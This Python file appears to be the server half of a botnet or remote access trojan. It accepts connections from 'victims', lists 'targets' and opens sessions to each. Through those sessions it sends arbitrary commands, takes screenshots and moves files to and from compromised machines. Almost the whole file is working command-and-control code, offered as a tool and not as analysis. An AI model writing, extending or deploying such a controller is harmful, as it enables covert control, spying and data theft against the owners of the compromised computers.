from termcolor import colored
from socket import *
import sys
import json
import base64
import threading 

class Server:
    def __init__(self,ip,port):
        ## declare tagets and ip list to store connections from clients
        self.targets = []
        self.Ips = []
        self.victim = 0
        self.stop_threads = False

        ## the number of client connections established
        self.client = 0 

        ## socket(ip,port) open on server side
        self.ip = ip 
        self.port = port 
        print(colored("[+] Starting the program...",'red'))

        ## initialize a socket on server side
        self.server_socket = socket(AF_INET,SOCK_STREAM)
        self.server_socket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        self.server_socket.bind((self.ip,self.port))
        self.server_socket.listen(5)
        ## accept only 5 connections from clients
        print(colored("[+] A server listening on {}:{}".format(self.ip,self.port),'green'))

        self.thd1 = threading.Thread(target=self.server_Threads) 
        self.thd2 = threading.Thread(target=self.center_board)
        self.thd1.start()
        self.thd2.start()

    
    def server_Threads(self):
        ### waiting conections from mutiple clients
        print(colored('[+] Waiting for connecting from client','green'))
        while True: 
                if self.stop_threads:
                    break
                try:
                    client_socket,clientIp = self.server_socket.accept()
                    self.targets.append(client_socket)
                    self.Ips.append(clientIp)
                    print(colored("\n[+] A connection established from {}".format(clientIp),'green'))
                    self.client = self.client + 1
                except: 
                    pass


    def execute_remotely(self,command): 
    ###  send commands to victims and receive results
        if command[0] == 'exit':
            self.send_data(command[0])
            return
        elif command[0] == 'help' or command[0] == 'screenshot' or command[0] == 'check':
            self.send_data(command[0])
            return self.receive_data()
        else:
            self.send_data(command)
            return self.receive_data()   
         
    def send_data(self,data):
        ## convert data to json format and continue covert to bytes
        json_data = json.dumps(data)
        self.victim.send(json_data.encode())

    def receive_data(self):
        data = b""
        while True: 
            try:
                ## concatenate data until enough by checking ValueError
                data = data + self.victim.recv(1024)
                    ## because data in byte format so we have to convert them to str 
                return json.loads(data.decode())
            except ValueError:
                continue


    def read_file(self,path):
        with open(path,'rb') as output:
                ## convert binary to bytes 
            return base64.b64encode(output.read())


    def write_file(self,path,content):
        try:
            with open(path,'wb') as output:
                # convert content to bytes and continue decode with base64
                output.write(base64.b64decode(content.encode()))
            return '[+] Write data to file succesfully!'
        except:
            return "[-] failed to write data to file !"     

    ## starting the program from run function
    def run(self):
        print(colored("Enter help to show options",'green'))
        result = ""
        command = ""
        while True: 
            try: 
                ## take commands 
                command = input(">> ")
                command = command.split(" ")
                if command[0] == 'exit':
                    break
                ## check if upload file -> read file and send content                
                if command[0] == 'upload'and len(command)>1:
                    content = self.read_file(command[1])
                    ## convert bytes to string before serialize using json format
                    ## because json only accepts string,list,dict...
                    command.append(content.decode())
                result = self.execute_remotely(command)
                if command[0] == 'screenshot':
                    result = self.write_file("screenshot.png",result)
                ## check whether command is download? and not any error during executing
                if command[0] == 'download' and '[-]' not in result:
                    result = self.write_file(command[1],result)
            except KeyboardInterrupt:
                break
            except Exception as e: 
                print(colored('[-] An Error has occured during running the program: '+str(e),'red'))
            if 'help' in command:
                print(colored("\t\t\t\t\tMenu options","blue"))
                for x in result:
                    print(colored("\t\t{}".format(x),'green'))
            else:
                print(result)

    def center_board(self):
    ## center of bonet network
        while True: 
            try:
                print(colored("Enter: \n\ttargets --> show sessions\n\tsession i ---> starting a session with a specific client",'green'))
                command = input(colored("Center: ","blue")).split(" ")
                if command[0] == "targets":
                    for x in self.Ips:
                        print(x)
                elif command[0] == "session" and len(command) > 1: 
                    self.victim =  self.targets[int(command[1])]
                    self.run()
                elif command[0] == "exit":
                    for x in self.targets:
                        x.close()
                        self.stop_threads = True 
                    self.server_socket.close()
                    self.thd1.join()
                    self.thd2.join()
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(e)
                pass                
                

sv = Server('localhost',2222)


